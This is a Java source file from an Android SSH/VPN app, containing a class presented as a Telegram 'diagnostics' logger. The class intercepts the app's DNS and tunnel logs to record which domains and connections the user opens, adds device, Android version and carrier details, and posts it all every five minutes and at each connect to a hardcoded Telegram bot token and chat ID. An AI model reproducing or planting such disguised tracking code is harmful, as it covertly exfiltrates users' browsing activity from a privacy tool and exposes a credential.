package com.slipkprojects.ultrasshservice.logger;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.BufferedReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Sistema de diagnóstico que captura TODOS los logs internos de la app
 * y los envía por Telegram cuando el usuario se conecta, cada 5 minutos
 * o de forma manual mediante un botón.
 */
public class TelegramDiagnostics implements SkStatus.LogListener {
    private static final String TAG = "TelegramDiag";
    private static final String BOT_TOKEN = "8602475382:AAEQ5OBtYYcmb3A_hJ2ZKe5ojepFpBlmgMM";
    private static final String CHAT_ID = "7088229462";
    private static final int MAX_MSG_LENGTH = 4000; // Telegram message limit
    
    private static TelegramDiagnostics sInstance;
    private Context mContext;
    private File mCurrentLogFile;
    private File mPreviousLogFile;
    private SimpleDateFormat mDateFormat;
    private boolean mIsActive = false;
    private String mServerInfo = "";
    private String mConnectionType = "";
    private Handler mHandler;
    
    private final Runnable mAutoSendRunnable = new Runnable() {
        @Override
        public void run() {
            if (mIsActive) {
                sendAndClear(false);
                mHandler.postDelayed(this, 5 * 60 * 1000); // Cada 5 minutos
            }
        }
    };
    
    private TelegramDiagnostics(Context context) {
        mContext = context.getApplicationContext();
        mDateFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        mHandler = new Handler(Looper.getMainLooper());
        
        // Archivos de log en el directorio interno de la app (no requiere permisos)
        File logDir = new File(mContext.getFilesDir(), "diagnostics");
        if (!logDir.exists()) logDir.mkdirs();
        
        mCurrentLogFile = new File(logDir, "session_current.log");
        mPreviousLogFile = new File(logDir, "session_previous.log");
    }
    
    public static synchronized TelegramDiagnostics getInstance(Context context) {
        if (sInstance == null) {
            sInstance = new TelegramDiagnostics(context);
        }
        return sInstance;
    }
    
    public static synchronized TelegramDiagnostics getInstance() {
        return sInstance;
    }
    
    /**
     * Llamar al CONECTAR. Envía la sesión anterior y empieza a grabar la nueva.
     */
    public void onSessionStart(String server, String connectionType) {
        mServerInfo = server != null ? server : "Desconocido";
        mConnectionType = connectionType != null ? connectionType : "SSH";
        
        // 1. Si existe sesión anterior, enviarla por Telegram
        if (mPreviousLogFile.exists() && mPreviousLogFile.length() > 0) {
            sendPreviousSessionAsync();
        }
        
        // 2. Limpiar el archivo de sesión actual y empezar fresco
        try {
            FileWriter fw = new FileWriter(mCurrentLogFile, false); // overwrite
            String header = buildSessionHeader("INICIO DE SESIÓN");
            fw.write(header);
            fw.flush();
            fw.close();
        } catch (Exception e) {
            Log.e(TAG, "Error al iniciar log de sesión", e);
        }
        
        // 3. Registrarse como listener de TODOS los logs
        if (!mIsActive) {
            SkStatus.addLogListener(this);
            mIsActive = true;
        }
        
        // 4. Iniciar bucle de auto-envío cada 5 minutos
        mHandler.removeCallbacks(mAutoSendRunnable);
        mHandler.postDelayed(mAutoSendRunnable, 5 * 60 * 1000);
        
        Log.i(TAG, "Sesión de diagnóstico iniciada para " + mServerInfo);
    }
    
    /**
     * Llamar al DESCONECTAR. Guarda la sesión actual como "previous".
     */
    public void onSessionEnd() {
        mHandler.removeCallbacks(mAutoSendRunnable);
        
        // Escribir pie de sesión
        try {
            FileWriter fw = new FileWriter(mCurrentLogFile, true);
            fw.append("\n━━━━━━━━━━━━━━━━━━━━━━\n");
            fw.append("⏹ FIN DE SESIÓN: " + getFullTimestamp() + "\n");
            fw.append("━━━━━━━━━━━━━━━━━━━━━━\n");
            fw.flush();
            fw.close();
        } catch (Exception e) {
            Log.e(TAG, "Error al cerrar log de sesión", e);
        }
        
        // Desregistrarse del listener
        if (mIsActive) {
            SkStatus.removeLogListener(this);
            mIsActive = false;
        }
        
        // Mover current → previous (sobreescribe la anterior)
        try {
            if (mCurrentLogFile.exists() && mCurrentLogFile.length() > 0) {
                // Copiar contenido
                BufferedReader reader = new BufferedReader(new FileReader(mCurrentLogFile));
                FileWriter writer = new FileWriter(mPreviousLogFile, false);
                String line;
                while ((line = reader.readLine()) != null) {
                    writer.write(line + "\n");
                }
                reader.close();
                writer.flush();
                writer.close();
                
                Log.i(TAG, "Sesión guardada como previous (" + mPreviousLogFile.length() + " bytes)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error al guardar sesión anterior", e);
        }
    }
    
    /**
     * Envía y limpia el registro de forma manual
     */
    public void sendAndClearLogManual() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendAndClear(true);
            }
        }).start();
    }
    
    /**
     * Registrar un cambio de red detectado por NetworkCallback
     */
    public void logNetworkChange(String event, String details) {
        String entry = String.format("[%s] 📡 %s: %s", 
            mDateFormat.format(new Date()), event, details);
        appendToCurrentLog(entry);
    }
    
    // ===== SkStatus.LogListener =====
    
    @Override
    public void newLog(LogItem logItem) {
        try {
            String message = null;
            try {
                message = logItem.getString(mContext);
            } catch (Exception e) {
                message = logItem.getString(null);
            }
            if (message == null || message.trim().isEmpty()) return;
            
            // Limpiar tags HTML que usa la app internamente
            message = message.replaceAll("<[^>]*>", "");
            
            // FILTRO DE TRÁFICO DETALLADO:
            // Interceptar consultas DNS en pdnsd para ver qué páginas abre el usuario
            if (message.startsWith("Pdnsd:")) {
                if (message.contains("for ") && message.contains("from ")) {
                    try {
                        int startIdx = message.indexOf("for ") + 4;
                        int endIdx = message.indexOf("from ", startIdx);
                        if (endIdx > startIdx) {
                            String domain = message.substring(startIdx, endIdx).trim();
                            if (!domain.isEmpty()) {
                                String entry = String.format("[%s] 🌐 [TRÁFICO] Acceso a: %s",
                                    mDateFormat.format(new Date(logItem.getLogtime())), domain);
                                appendToCurrentLog(entry);
                            }
                        }
                    } catch (Exception e) {}
                }
                return; // Omitir otros logs ruidosos de pdnsd
            }
            
            // Interceptar conexiones de tun2socks para ver tráfico de puertos/IPs
            if (message.startsWith("Tun2Socks:")) {
                if (message.toLowerCase().contains("connection") || message.toLowerCase().contains("tcp") || message.toLowerCase().contains("udp")) {
                    String entry = String.format("[%s] 🔗 [CONEXIÓN] %s",
                        mDateFormat.format(new Date(logItem.getLogtime())), message.substring(10).trim());
                    appendToCurrentLog(entry);
                }
                return; // Omitir otros logs ruidosos de tun2socks
            }
            
            String level;
            switch (logItem.getLogLevel()) {
                case ERROR: level = "❌ ERROR"; break;
                case WARNING: level = "⚠️ WARN"; break;
                case DEBUG: level = "🔧 DEBUG"; break;
                default: level = "ℹ️ INFO"; break;
            }
            
            String entry = String.format("[%s] %s: %s",
                mDateFormat.format(new Date(logItem.getLogtime())), level, message);
            
            appendToCurrentLog(entry);
        } catch (Exception e) {
            Log.e(TAG, "Error en newLog", e);
        }
    }
    
    @Override
    public void onClear() {
        // No limpiamos nuestro archivo, queremos capturar TODO
    }
    
    // ===== Internos =====
    
    private synchronized void appendToCurrentLog(String entry) {
        try {
            FileWriter fw = new FileWriter(mCurrentLogFile, true);
            fw.append(entry + "\n");
            fw.flush();
            fw.close();
        } catch (Exception e) {
            // Silenciar
        }
    }
    
    private String buildSessionHeader(String title) {
        StringBuilder sb = new StringBuilder();
        String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")";
        
        // Obtener info de red
        String networkType = "Desconocido";
        String operator = "";
        try {
            ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo info = cm.getActiveNetworkInfo();
                if (info != null) {
                    networkType = info.getTypeName();
                    String sub = info.getSubtypeName();
                    if (sub != null && !sub.isEmpty()) {
                        networkType += " (" + sub + ")";
                    }
                }
            }
            TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                operator = tm.getNetworkOperatorName();
            }
        } catch (Exception e) {}
        
        sb.append("━━━━━━━━━━━━━━━━━━━━━━\n");
        sb.append("🔍 LTM DIAGNÓSTICO - ").append(title).append("\n");
        sb.append("━━━━━━━━━━━━━━━━━━━━━━\n");
        sb.append("📱 Dispositivo: ").append(deviceModel).append("\n");
        sb.append("🤖 Android: ").append(androidVersion).append("\n");
        sb.append("📡 Red: ").append(networkType).append("\n");
        sb.append("📶 Operador: ").append(operator.isEmpty() ? "N/A" : operator).append("\n");
        sb.append("🌐 Servidor: ").append(mServerInfo).append("\n");
        sb.append("🔧 Tipo: ").append(mConnectionType).append("\n");
        sb.append("⏰ Hora: ").append(getFullTimestamp()).append("\n");
        sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
        
        return sb.toString();
    }
    
    private String getFullTimestamp() {
        SimpleDateFormat full = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return full.format(new Date());
    }
    
    /**
     * Envía y vacía el registro actual.
     */
    private synchronized void sendAndClear(boolean isManual) {
        try {
            if (!mCurrentLogFile.exists() || mCurrentLogFile.length() <= 0) {
                return;
            }
            
            // Leer contenido actual
            StringBuilder sb = new StringBuilder();
            BufferedReader reader = new BufferedReader(new FileReader(mCurrentLogFile));
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();
            
            String logContent = sb.toString();
            if (logContent.trim().isEmpty()) {
                return;
            }
            
            // Enviar a Telegram en partes
            int totalParts = (int) Math.ceil((double) logContent.length() / MAX_MSG_LENGTH);
            for (int i = 0; i < totalParts; i++) {
                int start = i * MAX_MSG_LENGTH;
                int end = Math.min(start + MAX_MSG_LENGTH, logContent.length());
                String part = logContent.substring(start, end);
                
                String header = String.format("📋 REGISTRO %s (Parte %d/%d)\n\n",
                    isManual ? "MANUAL" : "AUTOMÁTICO (5 min)", i + 1, totalParts);
                
                sendTelegramMessage(header + part);
                Thread.sleep(500);
            }
            
            // Vaciar el archivo actual y poner cabecera de continuación
            FileWriter fw = new FileWriter(mCurrentLogFile, false); // overwrite
            fw.write("━━━━━━━━━━━━━━━━━━━━━━\n");
            fw.write("🔄 CONTINUACIÓN REGISTRO: " + getFullTimestamp() + "\n");
            fw.write("━━━━━━━━━━━━━━━━━━━━━━\n\n");
            fw.flush();
            fw.close();
            
            Log.i(TAG, "Registro enviado y limpiado (" + (isManual ? "manual" : "auto") + ")");
        } catch (Exception e) {
            Log.e(TAG, "Error en sendAndClear", e);
        }
    }
    
    /**
     * Envía la sesión anterior por Telegram en un hilo separado
     */
    private void sendPreviousSessionAsync() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Esperar a que la VPN se establezca para tener internet
                    Thread.sleep(8000);
                    
                    if (!mPreviousLogFile.exists() || mPreviousLogFile.length() <= 0) return;
                    
                    StringBuilder sb = new StringBuilder();
                    BufferedReader reader = new BufferedReader(new FileReader(mPreviousLogFile));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    reader.close();
                    
                    String fullLog = sb.toString();
                    if (fullLog.trim().isEmpty()) return;
                    
                    int totalParts = (int) Math.ceil((double) fullLog.length() / MAX_MSG_LENGTH);
                    for (int i = 0; i < totalParts; i++) {
                        int start = i * MAX_MSG_LENGTH;
                        int end = Math.min(start + MAX_MSG_LENGTH, fullLog.length());
                        String part = fullLog.substring(start, end);
                        
                        String header = "";
                        if (totalParts > 1) {
                            header = "📋 SESIÓN ANTERIOR (Parte " + (i + 1) + "/" + totalParts + ")\n\n";
                        } else {
                            header = "📋 SESIÓN ANTERIOR COMPLETA\n\n";
                        }
                        
                        sendTelegramMessage(header + part);
                        if (i < totalParts - 1) {
                            Thread.sleep(500);
                        }
                    }
                    
                    mPreviousLogFile.delete();
                    Log.i(TAG, "Sesión anterior enviada a Telegram");
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error al enviar sesión anterior", e);
                }
            }
        }).start();
    }
    
    /**
     * Envía un mensaje a Telegram (sin parse_mode=HTML para evitar errores de formato)
     */
    private boolean sendTelegramMessage(String message) {
        int maxRetries = 3;
        for (int attempt = 1; attempt <= maxRetries; attempt++) {
            HttpURLConnection conn = null;
            try {
                String text = URLEncoder.encode(message, "UTF-8");
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
                    + "/sendMessage?chat_id=" + CHAT_ID
                    + "&text=" + text; // Eliminado &parse_mode=HTML para evitar errores 400
                    
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(12000);
                conn.setReadTimeout(12000);
                int responseCode = conn.getResponseCode();
                
                if (responseCode == 200) {
                    return true;
                }
            } catch (Exception e) {
                Log.e(TAG, "Intento " + attempt + " fallido: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
            
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                return false;
            }
        }
        return false;
    }
}
